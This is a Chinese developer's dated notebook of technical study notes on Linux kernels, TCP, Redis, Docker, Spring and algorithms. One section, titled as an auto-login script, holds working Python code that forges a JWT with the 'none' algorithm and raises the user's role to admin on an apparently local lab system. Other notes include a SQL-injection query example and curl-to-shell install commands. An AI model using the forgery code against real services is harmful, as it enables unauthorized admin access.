---
title: 📖 202211 ～ 202304
---

每天可能各种地方学到一些零碎的知识点，不便于立马整理成笔记，就单独零碎地记录下来。

等某一个部分积累足够多时，再系统地整理。

## 2022-11-18

### 深究进程与线程

进程与线程表面的区别是进程为资源调度的单位、线程为CPU调度的单位，但实质上二者在linux系统中为 `task_struct` 结构体。

进程调用函数链为：fork -> do_fork -> copy_process

线程调用函数链为：pthread_create -> do_clone -> clone -> do_fork -> copy_process

它们最终都是通过 `do_fork` 函数创建而成，其本质区别就是是否**共享地址空间**。

-   而是否共享地址空间是通过调用 `do_fork` 函数时传递的参数决定：clone_flags标记。
    -   创建进程的flag标记为 `SIGCHLD`
    -   创建线程的flag标记为 CLONE_VM、CLONE_FS、CLONE_FILES、CLONE_SIGNAL、CLONE_SETTLS、CLONE_PARENT_SETTID、CLONE_CHILD_CLEARTID、CLONE_SYSVSEM，用 | 链接

子进程通过拷贝父进程的各类资源（如task_struct、文件列表、虚拟内存空间、IO、namespace等）实现创建。

-   其中虚拟内存空间是通过 `mm_struct` 结构体实现，子进程通过拷贝一份父进程的mm_struct，实现地址共享

而对于linux内核来说，线程其实就是一个共享特定资源的进程而已。

## 2022-11-22

### 深入理解三次握手

源码中通过全连接队列与半连接队列分别管理三次握手最终得到的Socket以及握手中间过程的Socket

<img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221122132944440.png" alt="image-20221122132944440"  />

1.   服务器listen开启监听：计算全连接与半连接队列长度，并分配内存进行初始化

2.   客户端通过connect发起连接：将Socket状态置为**TCP_SYN_SENT**，通过**inet_hash_connect**函数动态选择一个端口。

     在**tcp_connect**函数中，根据Socket中的信息构造一个**SYN**报文并发送。同时启动了**重传定时器**

     ```c
     //file: net/ipv4/tcp_ipv4.c
     int tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)
     {
         //设置 socket 状态为 TCP_SYN_SENT
         tcp_set_state(sk, TCP_SYN_SENT);
     
         //动态选择一个端口
         err = inet_hash_connect(&tcp_death_row, sk);
     
         //函数用来根据 sk 中的信息，构建一个完成的 syn 报文，并将它发送出去。
         err = tcp_connect(sk);
     }
     ```

3.   服务器响应客户端发送的SYN报文：

     1.   先去查看半连接队列中查看是否存在。由于此时服务器是第一次响应SYN，半连接队列一定为空，直接返回
     2.   之后判断半连接队列与全连接队列是否满了
          -   **如果半连接队列满，且未开启 tcp_syncookies，那么该握手包将直接被丢弃**
          -   **如果全连接队列满了，且有 young_ack 的话，那么同样也是直接丢弃。**
     3.   构造SYN_ACK包，将当前握手信息添加到半连接队列中，开启重传定时器

     ```c
     //file: net/ipv4/tcp_ipv4.c
     int tcp_v4_do_rcv(struct sock *sk, struct sk_buff *skb)
     {
         // 服务器收到第一步握手 SYN 或者第三步 ACK 都会走到这里
         if (sk->sk_state == TCP_LISTEN) {
             struct sock *nsk = tcp_v4_hnd_req(sk, skb);
         }
     	// 进行队列大小判断、构造包、添加半连接队列、开启定时器操作
         if (tcp_rcv_state_process(sk, skb, tcp_hdr(skb), skb->len)) {
             rsk = sk;
             goto reset;
         }
     }
     ```

     ```c
     //file:net/ipv4/tcp_input.c
     int tcp_rcv_state_process(struct sock *sk, struct sk_buff *skb,
                               const struct tcphdr *th, unsigned int len)
     {
         switch (sk->sk_state) {
             //第一次握手
             case TCP_LISTEN:
                 if (th->syn) { //判断是 SYN 握手包
     				...
                     // 进行队列大小判断、构造包、添加半连接队列、开启定时器操作
                     if (icsk->icsk_af_ops->conn_request(sk, skb) < 0) return 1;
                 }
             ...
         }
     }  
     ```

4.   客户端响应SYN_ACK：也会进入到**tcp_rcv_state_process**函数，但会进入到switch中的TCP_SYC_SENT对应的分支进行处理

     删除connect时设置的重传定时器，将当前的Socket状态设置为**ESTABLISHED**，开启**保活定时器**，发出第三次握手的**ACK**确认

5.   服务器响应ACK：inet_csk_search_req 负责在半连接队列里进行查找，找到以后返回一个半连接 request_sock 对象。然后进入到 tcp_check_req 中。

6.   1.   创建子Socket：判断全连接队列是否满了
     2.   删除半连接队列
     3.   将握手成功的Socket添加到全连接链表的末尾
     4.   设置连接状态为**ESTABLISHED**、

7.   服务器accept：从已经建立好的全连接队列中返回头节点Socket给用户进程 `request_sock *req = queue->rskq_accept_head;`

## 2022-11-23

### 缓存延迟双删策略

Redis与数据库出现一致性问题的场景

1.   先删除缓存，再更新数据库

     2 个线程要并发「读写」数据，可能会发生以下场景：

     1.  线程 A 要更新 X = 2（原值 X = 1）
     2.  线程 A 先删除缓存
     3.  线程 B 读缓存，发现不存在，从数据库中读取到旧值（X = 1）
     4.  线程 A 将新值写入数据库（X = 2）
     5.  线程 B 将旧值写入缓存（X = 1）

     最终 X 的值在缓存中是 1（旧值），在数据库中是 2（新值），发生不一致。

2.   数据库读写分离 + 主从复制延迟过高

     即使在先更新数据库，再删除缓存的方案下，仍然会产生一致性问题

     1.  线程 A 更新主库 X = 2（原值 X = 1）
     2.  线程 A 删除缓存
     3.  线程 B 查询缓存，没有命中，查询「从库」得到旧值（从库 X = 1）
     4.  从库「同步」完成（主从库 X = 2）
     5.  线程 B 将「旧值」写入缓存（X = 1）

     最终 X 的值在缓存中是 1（旧值），在主从库中是 2（新值），也发生不一致。

以上场景均会产生一致性问题，原因是：**缓存都被回种了「旧值」**

-   第一个场景一般不推荐，因为非常容易产生一致性问题，一般采用 「先更新数据库，再删除缓存」方案

    如果一定要使用该方案，可以采用缓存延迟双删策略：

    **删除缓存并更新完数据库之后，休眠一段时间，再删除一次缓存**

-   第二个场景：更新完主库并删除缓存之后，生成一条**延时消息**，写到消息队列中，消费者延时删除缓存

>   延迟时间的选择一般比较难确定（尤其在分布式高并发场景下），根据经验是1-5s
>
>   所以一般尽可能使用「先更新数据库，再删除缓存」方案，并且尽可能降低主从复制的延迟

此外，在「先更新数据库，再删除缓存」方案下，删除缓存采用

1.   **消息队列**进行异步删除，可以防止删除缓存失败导致的重试操作，一直占据线程资源，无法服务其他客户端请求。

     -   **消息队列保证可靠性**：写到队列中的消息，成功消费之前不会丢失（重启项目也不担心）
     -   **消息队列保证消息成功投递**：下游从队列拉取消息，成功消费后才会删除消息，否则还会继续投递消息给消费者（符合我们重试的场景）

2.   **订阅数据库变更日志，再操作缓存**

     只需修改数据库，无需操作缓存。当一条数据发生修改时，MySQL产生一条变更日志Binlog。通过订阅该日志，拿到具体操作的数据，然后根据该数据去删除对应的缓存

     订阅变更日志，目前也有了比较成熟的开源中间件，例如阿里的 canal，使用这种方案的优点在于：

     -   **无需考虑写消息队列失败情况**：只要写 MySQL 成功，Binlog 肯定会有
     -   **自动投递到下游队列**：canal 自动把数据库变更日志「投递」给下游的消息队列

## 2022-11-26

### 幂等性理解

幂等性：任意多次执行所产生的影响均与一次执行的影响相同。

对于前端重复提交的数据或请求，后端只产生一种结果。

重复消费：当消费者消费完消息之后，在给生产端返回ACK时网络异常，导致生产端未收到消息，消息会被再次发送。

-   客户端上用户创建订单并发起支付，请求后端微服务。订单服务作为生产者将此请求放入消息队列中，支付服务作为消费者取出请求，然而消费完成之后在返回ACK的过程中发生了网络中断。

异常情况如下：

1.   支付场景下由于网络异常，用户发出了多次支付请求。
2.   创建订单时，第一次调用服务超时，再次调用产生多笔订单。
3.   扣减库存超时，多次扣减产生错误库存

解决方案：

1.   利用数据库唯一索引特性，保证数据唯一。

     -   针对支付场景，可将订单的流水号作为唯一索引。若对同一订单发起了多次请求，则直接过滤掉第一次之后的请求。

2.   利用状态机保证幂等性

     -   订单状态可分为：待支付、已支付、已取消、退款等，根据状态判断当前操作的正确性

3.   利用Redis实现Token机制

     过程如下：

     1.   前端先向后端发送获取Token的请求，后端生成一个全局唯一的ID保存在Redis中（带有超时时间），将ID返回给前端
     2.   前端拿到Token之后携带Token向后端发起业务请求
     3.   后端校验该Token：通过调用Redis的delete方法。若返回True，则代表是第一次请求，放行。

     具体实现：自定义幂等校验注解，对需要进行幂等校验的接口添加注解。幂等校验拦截器只对带有该注解的接口进行拦截校验。

## 2022-11-27

### Redis消息队列演化

List用作消息队列可靠性保证：`BRPOPLPUSH`命令，从list中读取消息的同时，将消息插入到另一个list中保存

## 2022-11-29

### 二叉搜索树第K大节点

Morris Inorder 遍历：先遍历右节点，再判断当前节点，最后遍历左节点

```python
def kthLargest(self, root: TreeNode, k: int) -> int:
    def dfs(root):
        if not root:
            return
        dfs(root.right)
        if self.k == 0:
            return
        self.k -= 1
        if self.k == 0:
            self.res = root.val
            return
        dfs(root.left)
    self.k = k
    dfs(root)
    return self.res
```

## 2022-12-1

### Tarjan割点算法

以下前提是在dfs搜索树中讨论父子关系

割点 case1：非root && 有儿子 && `low[x的儿子] >= dfn[x]`

割点 case2：root && 儿子数目 >= 2

桥 case：low[y] > dfn[x]

## 2022-12-4

### CentOS虚拟机连接外网

局域网内主机与虚拟机互相ping时，一定要注意保持在同一网段内

centos虚拟机更改如下配置：

```
cd /etc/sysconfig/network-script/

BOOTPROTO=static，ONBOOT=yes，添加IPADDR、GATEWAY、NETMASK

service network restart
```

```
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no
BOOTPROTO=static # 配置为static
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_FAILURE_FATAL=no
NAME=ens160
UUID=73cdde6b-70c1-4d0c-8b48-1a42d054d99a
DEVICE=ens160
ONBOOT=yes
# IPADDR GATEWAY NETWORK 查看mac newtork preferences
IPADDR=10.249.19.5
GATEWAY=10.249.0.1
NETWORK=255.255.0.0
DNS1=10.249.0.1
DNS2=114.114.114.114
```

curl -L https://github.com/docker/compose/releases/download/v2.2.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose

## 2022-12-8

### Linux Arm64 安装Docker-Compose

Docker-Compose目前没有arm64版本，目前只支持pip安装

1.   安装apt-get

     -   apt-get命令是ubuntu等操作系统的安装命令，和yum为同类

     下载apt-get

     ```
     curl https://raw.githubusercontent.com/dvershinin/apt-get-centos/master/apt-get.sh -o /usr/local/bin/apt-get
     ```

     修改权限

     ```
     chmod 0755 /usr/local/bin/apt-get
     ```

2.   安装Docker Compose

     ```
     sudo apt-get update -y
     sudo apt-get upgrade -y
     sudo apt-get install curl python3-pip libffi-dev python-openssl libssl-dev zlib1g-dev gcc g++ make -y
     curl -sSL https://get.docker.com/ | sh
     sudo snap install rustup --classic
     sudo apt install rustc
     sudo pip3 install docker-compose
     sudo docker-compose --version
     ```

     sudo pip3 install docker-compose命令报错时，执行如下命令，然后再重新安装

     ```
     sudo -H pip3 install --upgrade pip
     ```

### CentOS7 snap安装步骤

新一代包管理工具 snap 安装部署

```
sudo yum install epel-release -y
sudo yum install snapd -y
sudo systemctl start snapd.socket
sudo systemctl status snapd.socket
sudo systemctl start snapd.service
sudo systemctl status snapd.service
sudo ln -sf /var/lib/snapd/snap /snap
snap version
```

### CentOS7 pip3安装步骤

安装完python3.6之后自带pip3

```
yum install -y python36
ln -s python3.6 python3
```

### Docker容器通信bug

主机中的容器失去与外界容器的连接:

1.  主机可以与其他主机通信。
2.  在主机中运行的容器无法与其他主机通信。

后台运行通过Dockerfile打包的Springboot镜像后提示：

```
WARNING: IPv4 forwarding is disabled. Networking will not work.
```

解决方案：

1.   将以下内容添加到 /etc/sysctl.conf 中

     ```
     net.ipv4.ip_forward=1
     ```

2.   重启网络服务

     ```
     service network restart
     ```


## 2022-12-9

### 快速幂模板

$$
a^1, a^2, a^4, a^8, ... a^{2[log_2n]}
$$

通过 O(logn) 算法复杂度可以计算出所有需要的 2^k^ 次幂

递归法：

```python
def power(x, y):
	if y < 0:
        return 1 / power(x, -y)
    if y == 0:
        return 1
    ans = power(x, y // 2)
    if y % 2 == 1:
        return x * ans * ans
    else:
        return ans * ans
```

迭代法：

```python
def power(x, y):
    ans = 1
    while y > 0:
        if y & 1:
            ans *= x
        x *= x
        y >>= 1
    return ans
```

## 2022-12-12

### volatile原理

volatile关键字主要是为解决多线程下变量的 **可见性** 问题

在操作系统中，程序运行时的临时数据是放置在内存中的，相比起CPU的处理速度，内存的读写速度慢得多。

为提高读写速度，引入介于CPU与内存之间的高速缓存。内存被各个CPU共享，而每一个CPU内核都拥有一块高速缓存。

当进行 `i = i + 1` 自增操作时，A核心先从内存中获取该数据，然后复制一份到自己独有的CPU高速缓存中，对数据进行更改之后，再将数据重新写回到缓存中，并将该缓存置为dirty。只有当A核心的当前缓存块需要被替换时，才会重新写入内存中。

这种处理流程在单线程的环境中不会产生问题，但是放置于多线程的环境中时：假设当A修改数据之后，B核心同时去内存中读取该数据，但是该数据仅是在A核心的高速缓存中被修改，因此修改后的数据对B核心是不可见的。造成**缓存一致性问题**。

为解决此问题，引入了**总线嗅探**与**MESI协议**。

总线嗅探：将某个核心修改缓存这一事件广播通知其他核心

volatile实现原则：共同保证了共享变量的可见性

1.   Lock前缀指令会引起CPU缓存写回到内存
2.   通过MESI协议，当某CPU缓存写回到内存时，其它CPU对应该数据的缓存将会失效，其它CPU需要获取该数据时，只能从内存获取最新的数据

使用场景：

1.   状态标记量：一个线程修改该状态标记量，另一个线程需要根据该状态标记量的修改执行相应的操作。因此需要保证可见性
2.   单例模式双重检查

## 2022-12-20

### DDD Domain-Driven Design

DDD补足了微服务架构下的部分缺陷：功能缺陷与工程缺陷

微服务场景下，对于服务会存在拆分不合理的情况。DDD可以指导微服务的拆分。

一个系统（或者一个公司）的业务范围和在这个范围里进行的活动，被称之为领域，领域是现实生活中面对的问题域，和软件系统无关，领域可以划分为子域，比如电商领域可以划分为商品子域、订单子域、发票子域、库存子域等。

-   **解决系统架构不清晰、内聚低、耦合高;**
-   **减少重构风险;**
-   **使各业务边界清晰;**
-   **可以随业务发展可很好拓展;**

## 2022-12-21

### Idea实现Remote Debug

Remote Debug可以用于解决当整个项目以Docker容器部署时难以调试的问题，远程服务器可以是本地、虚拟机或者云服务器

Remote Debug的原理：

1.   本地与远程服务器共用同一套代码（这个很关键，必须二者保持一致才可准确地实现debug）
2.   远程服务器在运行时，需要额外开放一个进程端口，供本地与远程服务器连接，即debug调试进程
3.   本地无需配置任何环境，只需要开启idea，并与远程服务器建立连接

注意的点：

1.   idea中JDK8以下与JDK9以上的版本配置方式有所区别，命令不同。根据对应的JDK版本与idea给出的命令配置
2.   Docker容器部署时，相当于多了一层映射。原本是只需要本地与远程服务器之间建立连接，而现在服务是部署于Docker容器中的，需要额外再建立远程服务器与Docker之间的debug进程端口映射，这样本地才可正确访问到debug端口
3.   只有当有进程运行在某个端口上时，才可访问端口（telnet）

## 2022-12-23

### VSCode 配置Remote SSH

通过VSCode插件实现远程连接服务器，访问服务器资源

1.   没有本地密钥先生成，在`~/.ssh/`目录下

     ```
     ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa-remote-ssh
     ```

2.   通过ssh登陆远程服务器，在 ~/.ssh/ 目录下创建 **authorized_keys**

3.   将**id_rsa-remote-ssh.pub**的内容复制到authorized_keys文件中

4.   去除服务器 /etc/ssh/sshd_config 内 `PubkeyAuthentication` 前的 # 号

5.   重启服务器ssh服务

     ```
     sudosystemctl restart sshd.service
     ```

6.   配置VSCode Remote SSH插件

     ```
     Host xxx                             # xxx 自定义连接名称
         User root                        # root 远程服务器账户名称
         HostName [IP地址]          		
         IdentityFile ~/.ssh/id_rsa_xxxx  # ~/.ssh/id_rsa_xxxx 本地密钥所在位置
     ```


### SQL注入实践

-   传统的JDBC

    可以对拼接的字符串实现SQL注入，形如

    ```
    "select * from PERSISTENCEUSER WHERE USERNAME = '" + name + "' AND PASSWORD = '" + password + "'"
    ```

    但是如果采用PrepareStatement时，会采用 `?` 占位符，动态地对参数赋值。

    此时无法完成SQL注入，因为其对注入sql中的单引号进行了转义

-   Mybatis

    1.   #将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号。

         如：where username=#{username}，如果传入的值是111,那么解析成sql时的值为where username="111", 如果传入的值是id则解析成的sql为where username="id".　

    2.   $将传入的数据直接显示生成在sql中。

         如：where username=${username}，如果传入的值是111,那么解析成sql时的值为where username=111；

-   JPA

    使用 `:参数名 ` 进行参数绑定

## 2022-12-25

### Go RPC

Go 标准库`net/rpc`提供了一个**简单、强大且高性能**的 RPC 实现

1.   通过rpc.Register(args)实现注册服务

     ```go
     func (server *Server) Register(rcvr any) error {
     	return server.register(rcvr, "", false)
     }
     ```

2.   通过Register注册的service中的方法，必须满足如下特性：

     -   service中的方法必须是导出的，即名字首字母大写（类似于public）
     -   service中的方法有两个参数，必须是导出的或内置类型。
         -   第一个为经过客户端传递的参数，第二个为需要返回给客户端的响应
         -   第二个参数必须为指针类型，因为需要对响应进行修改
     -   service中的方法必须返回error类型

## 2022-12-28

### Java SPI

使用 SPI 的前提是**面向接口编程**，即所有的依赖都是依赖接口，而非具体的实现类，且所有用到这个接口的地方都可以替换为实现类。

**Java SPI 正是通过在运行时替换实现类，来实现接口与实现的解耦，从而实现模块与模块的解耦。**

使用流程：

1.  在 jar 包的`META-INF/services`下面，创建一个接口全限定名的文件；
2.  在接口全限定名文件中，逐行填写具体的实现类；
3.  使用方引入 jar 包；
4.  使用`ServiceLoader.load`加载实现类；
5.  遍历获取实现类。

源码分析：核心实现类ServiceLoader

1.   ServiceLoader.load()：只做了初始化，并没有加载实现类

     ```java
     public static <S> ServiceLoader<S> load(Class<S> service) {
         //获取类加载器
         ClassLoader cl = Thread.currentThread().getContextClassLoader();
         //调用load方法，传入类加载器
         return ServiceLoader.load(service, cl);
     }
     ->
     public static <S> ServiceLoader<S> load(Class<S> service,
                                             ClassLoader loader)
     {
         //这里的load只是实例化了一个ServiceLoader
         return new ServiceLoader<>(service, loader);
     }
     ->
     private ServiceLoader(Class<S> svc, ClassLoader cl) {
         //检验并初始化要加载的类或接口
         service = Objects.requireNonNull(svc, "Service interface cannot be null");
         //初始化类加载器
         loader = (cl == null) ? ClassLoader.getSystemClassLoader() : cl;
         //初始化权限控制器
         acc = (System.getSecurityManager() != null) ? AccessController.getContext() : null;
         //重新加载，1、清空已加载的类，2、初始化LazyIterator
         reload();
     }
     ```

2.   ServiceLoader.iterator()：

     1.  `ServiceLoader`通过复写`iterator()`方法实现了遍历功能；
     2.  `ServiceLoader`的遍历器提供了一个简单缓存功能`knownProviders`，用于缓存已经加载并实例化的实现类；
     3.  `ServiceLoader`的遍历器非常简单，核心逻辑是通过`lookupIterator.hasNext()`和`lookupIterator.next()`实现的； 所以下面重点要分析`ServiceLoader`的`LazyIterator lookupIterator`。

     ```java
     public Iterator<S> iterator() {
         //直接实例化并返回了一个Iterator
         return new Iterator<S>() {
             //实例化遍历器时，将ServiceLoader已经实例化的实现类赋值给了成员变量knownProviders。
             Iterator<Map.Entry<String,S>> knownProviders
                 = providers.entrySet().iterator();
             //iterator.hasNext()会调用这个方法，判断是否还有实现类
             public boolean hasNext() {
                 //先判断已加载的实现类中是否存在，存在的话直接返回true
                 if (knownProviders.hasNext())
                     return true;
                 //如果不存在，则调用ServiceLoader中的lookupIterator，看是否存在。
                 return lookupIterator.hasNext();
             }
             //iterator.next()会调用这个方法，获取下一个实现类
             public S next() {
                 //如果已加载的实现类中存在，则返回已加载的实现类
                 if (knownProviders.hasNext())
                     return knownProviders.next().getValue();
                 //否则，调用ServiceLoader中的lookupIterator，获取下一个实现类。
                 return lookupIterator.next();
             }
             public void remove() {
                 throw new UnsupportedOperationException();
             }
         };
     }
     ```

3.   LazyIterator：具体地去加载实现类

     1.   hasNextService()
          1.  根据类或接口的全限定名加载配置文件；
          2.  解析文件中的所有实现类名；
          3.  遍历解析到的实现类名，作为下一个类名返回。
     2.   nextService()
          1.  根据`hasNextService()`获取到的类名，加载类；
          2.  类实例化；
          3.  将实例化的类保存到缓存中，key= 类全限定名，value= 类实例。

### Mac的Host映射

打开终端/iTerm

```
sudo vim /etc/hosts
```

添加一行

```arduino
10.249.238.5 gulimall.com
```

## 2023-1-6

### 异步多活架构演进

系统可用性：

-   **平均故障间隔 MTBF**（Mean Time Between Failure）：表示两次故障的间隔时间，也就是系统「正常运行」的平均时间，这个时间越长，说明系统稳定性越高
-   **故障恢复时间 MTTR**（Mean Time To Repair）：表示系统发生故障后「恢复的时间」，这个值越小，故障对用户的影响越小

N个9衡量可用性

![img](https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/16342320382032.png)

1.   单机架构：单应用对应单数据库

     ⬇️

2.   主从架构：在不同服务器上部署多个应用，多个数据库（主从）。由接入层Nginx进行负载均衡

     ⬇️

3.   同城灾备：防止同一机柜或同一机房的服务器同时宕机，于是将主从架构升级为同城多机房部署

     发生故障时：（热备）

     -   B 机房所有从库提升为主库
     -   DNS 指向 B 机房接入层，接入流量，业务恢复

     <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/16342338343496.jpg" alt="img" style="zoom: 25%;" />

     ⬇️

4.   同城双活：进一步升级同城灾备，使得B机房并不仅用于宕机切换，而是接入流量并正常使用

     -   把 B 机房的接入层 IP 地址，加入到 DNS 中
     -   区分读写分离：两个机房读流量，可以读任意机房的存储；但写流量，只能写A机房

     这样便可在A机房宕机时，将业务放心转移到B机房

     <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/16342338343503.jpg" alt="img" style="zoom:25%;" />

     ⬇️

5.   

## 2022-1-13

### 自动登录脚本

Python脚本实现

1.   引入selenium

     ```python
     from selenium import webdriver
     ```

2.   创建全局的webdriver

     ```python
     wd = webdriver.Chrome()
     ```

     ```python
     # 自动登陆并获取Token
     def get_token(username, password):
         global wd
         wd.get("http://10.249.238.10/client_login.html")
         alertObject = wd.switch_to.alert
         alertObject.accept()
         time.sleep(2)
         # wd.find_element(value="flow_preserve_login_email").send_keys(username)
         # time.sleep(2)
         # wd.find_element(value="flow_preserve_login_password").send_keys(password)
         # time.sleep(2)
         wd.find_element(value="client_login_button").click()
         time.sleep(5)
         return wd.execute_script('return sessionStorage.getItem("client_token")')
     ```

     ```python
     # 破解Token篡改名字与权限
     def crack_token(token: str) -> str:
         ts = token.split('.')
         json1 = base64.b64decode(ts[0])
         json1 = str(json1)
         json1 = json1.replace("HS256", "none")
         # print(ts[1])
         json2 = base64.b64decode(ts[1] + "==")
         json2 = str(json2)
         json2 = json2.replace("ROLE_USER", "ROLE_ADMIN")
         json2 = json2.replace("fdse_microservice", "lty")
         json1 = json1[json1.find('{'):json1.find('}') + 1]
         json2 = json2[json2.find('{'):json2.find('}') + 1]
         print(json1)
         print(json2)
         header = str(base64.b64encode(json1.encode("utf-8")), "utf-8")
         payload = str(base64.b64encode(json2.encode("utf-8")), "utf-8")
         print(header + '.' + payload + '.' + ts[2])
         return header + '.' + payload + '.' + ts[2]
     ```

     ```python
     # 重新放置新的Token
     def put_token_normal(token):
         global wd
         # wd.get("http://10.249.238.10")
         wd.execute_script("sessionStorage.setItem('client_name', 'lty')")
         wd.execute_script("sessionStorage.setItem('client_token', arguments[0])", token)
         wd.refresh()
     ```

     ```python
     # 放置Token到Admin页面
     def put_token_admin(token):
         global wd_admin
         wd_admin.get("http://10.249.238.10/adminlogin.html")
         wd_admin.execute_script("sessionStorage.setItem('admin_name', 'lty')")
         wd_admin.execute_script("sessionStorage.setItem('admin_token', arguments[0])", token)
         wd_admin.get("http://10.249.238.10/admin.html")
         # wd_admin.refresh()
     ```


## 2022-1-14

### 数据库结构导出为Excel

```sql
SELECT
  TABLE_NAME 表名,
  COLUMN_NAME 列名,
  COLUMN_TYPE 数据类型,
  DATA_TYPE 字段类型,
  CHARACTER_MAXIMUM_LENGTH 长度,
  IS_NULLABLE 是否为空,
  COLUMN_DEFAULT 默认值,
  COLUMN_COMMENT 备注 
FROM
 INFORMATION_SCHEMA.COLUMNS
where
-- developerclub为数据库名称，到时候只需要修改成你要导出表结构的数据库即可
table_schema ='riytiy_message' AND
table_name = 'user_notification'
```

## 2022-1-18

### Maven filtering标签作用

```xml
<resources>
    <resource>
        <directory>src/main/resources</directory>
        <!-- 关闭过滤 -->
        <filtering>false</filtering>
    </resource>
    <resource>
        <directory>src/main/webapp/</directory>
    </resource>
    <resource>
        <directory>src/main/resources</directory>
        <!-- 引入所有 匹配文件进行过滤 -->
        <includes>
            <include>application*</include>
            <include>bootstrap*</include>
            <include>logback*</include>
        </includes>
        <!-- 启用过滤 即该资源中的变量将会被过滤器中的值替换 -->
        <filtering>true</filtering>
    </resource>
</resources>
```

启用过滤（即指定为true）后，能够将匹配配置文件中的引用变量替换为真实的值

默认filtering值为false

### Maven dependency-type-pom

dependency的type标签默认为jar，表示引入一个特定的jar包

但是如果引入多个dependency jar包的时候，会导致pom.xml文件过大

此时可以自定义一个父项目，依赖该父项目，type为pom，表示引入该父项目的全部依赖

## 2022-1-25

### 客户端渲染与服务端渲染

客户端渲染和服务器端渲染的最重要的区别就是究竟是谁来完成html文件的完整拼接，如果是在服务器端完成的，然后返回给客户端，就是服务器端渲染，而如果是前端做了更多的工作完成了html的拼接，则就是客户端渲染。

服务端渲染优点：

1.   前端加载耗时少，渲染工作由后端完成
2.   有利于SEO，爬虫更容易获取到信息
3.   客户端占用资源少

服务端渲染缺点：

1.   不利于前后端分离，开发效率低
2.   服务器资源占用严重

服务端渲染适用于企业级网站，客户端渲染适用于后台管理系统

## 2022-2-8

### 用构造器替代@Autowired

Spring4.x新特性：如果类只提供了一个带参数的构造方法，则不需要对对其内部的属性写 @Autowired 注解，Spring 会自动为你注入属性。

因此可以弃用@Autowired注解，而是使用@RequiredArgsConstructor注解，通过构造器注入全部对象

## 2022-2-13

### Filed注入和@Autowired缺点

1.   构造器注入：**强依赖性**（即必须使用此依赖），**不变性**（各依赖不会经常变动）
     -   一旦注入，依赖不会发生变化
2.   Setter注入：**可选**（没有此依赖也可以工作），**可变**（依赖会经常变动）
     -   注入后，依赖可以通过setter方法改变
3.   Filed注入：依赖可变，耦合度高，与IoC容器紧耦合

**@Autowired** 是**Spring** 提供的，它是**特定IoC提供的特定注解** ，这就导致了应用与框架的**强绑定** ，一旦换用了其他的IoC框架，是**不能够支持注入** 的。

而 **@Resource** 是**JSR-250** 提供的，它是**Java标准** ，我们使用的IoC容器应当去兼容它，这样即使更换容器，也可以正常工作。

### Spring事务失效场景

1.   方法自调用

     声明式事务的底层是AOP实现，通过注入得到的对象并不是对象本身，而是对象的代理。

     在代理方法中，事务的实现由注解转为了代码。因此最终调用的方法是动态代理新生成的方法

     ```java
     public class UserServiceProxy extends UserService{
         public void sayHello(){
             try{
                 //开启事务
                 //调用父类 sayHello
                 //提交事务
             }catch(Exception e){
                 //回滚事务
             }
         }
     }
     ```

     如下：如果直接在当前类中调用类里的事务方法，则会导致失效，因为没有通过Spring注入，而是直接调用this

     ```java
     public class UserService{
         @Transactional
         public void sayHello(){}
         public void useSayHello(){sayHello();}
     }
     ```

2.   在方法中写了try-catch捕获异常，代理方法中则不会感知到异常，因此不会回滚。

3.   方法不是public，而声明式事务必须得为public方法

4.   非运行时异常RuntimeException会导致事务失效

5.   当前调用方法所属的Bean不是Spring Bean，没有交由Spring IoC容器管理

6.   数据库不支持事务

## 2022-2-15

### 非Spring环境获取Bean

1.   定义SpringUtils工具类，实现ApplicationContextAware接口，得到ApplicationContext
2.   定义getBean方法

能够在非Spring环境下获取Bean

通过此方式获取Bean，可以解决SpringBoot2.6.x以上版本的循环依赖问题

## 2022-3-4

### SpringAop配置

若需要使用SpringAop功能，需要添加@EnableAspectJAutoProxy注解

有了这个注解才能支持@Aspect等相关的一系列[AOP](https://so.csdn.net/so/search?q=AOP&spm=1001.2101.3001.7020)注解的功能，这个注解就相当于在传统的xml配置文件中添加 <aop:aspectj-autoproxy>一样

### 数据脱敏注解

实现流程

1.   自定义Sensitive注解

     -   @JacksonAnnotationsInside注解：被Jackson的注解拦截器（JacksonAnnotationIntrospector）findSerializer发现拦截并处理
     -   @JsonSerialize注解：配置数据脱敏JSON序列化工具
     -   注解属性strategy：脱敏规则 - 手机号、身份证、邮箱等

     ```java
     @Retention(RetentionPolicy.RUNTIME)
     @Target(ElementType.FIELD)
     @JacksonAnnotationsInside
     @JsonSerialize(using = SensitiveJsonSerializer.class)
     public @interface Sensitive {
         SensitiveStrategy strategy();
     }
     ```

2.   配置SensitiveStrategy脱敏规则 - 枚举类

3.   配置SensitiveJsonSerializer自定义脱敏序列化工具

     -   JsonSerializer：对脱敏数据进行处理
     -   ContextualSerializer：自定义注解被拦截后的回调函数，用于获取并设置strategy值

     ```java
     @Slf4j
     public class SensitiveJsonSerializer extends JsonSerializer<String> implements ContextualSerializer {
     
         private SensitiveStrategy strategy;
     
         @Override
         public void serialize(String value, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {
             try {
                 jsonGenerator.writeString(strategy.desensitizer().apply(value));
             } catch (BeansException e) {
                 log.error("Desensitization Implementation not exist, return initial data => {}", e.getMessage());
                 jsonGenerator.writeString(value);
             }
         }
     
         @Override
         public JsonSerializer<?> createContextual(SerializerProvider serializerProvider, BeanProperty beanProperty) throws JsonMappingException {
             Sensitive annotation = beanProperty.getAnnotation(Sensitive.class);
             if (Objects.nonNull(annotation) && Objects.equals(String.class, beanProperty.getType().getRawClass())) {
                 this.strategy = annotation.strategy();
                 return this;
             }
             return serializerProvider.findValueSerializer(beanProperty.getType(), beanProperty);
         }
     }
     ```


### @AutoConfiguration与@Configuration

-   configuration初始化总是在auto-configuration初始化之前
-   configuration初始化的顺序和扫描的过程相关，并不能进行有效的进行指定，不方便确定文件加载的顺序
-   auto-configuration可以通过`@AutoConfigureAfter` `@AutoConfigureBefore` 和 `@AutoConfigureOrder`来指定类的加载顺序

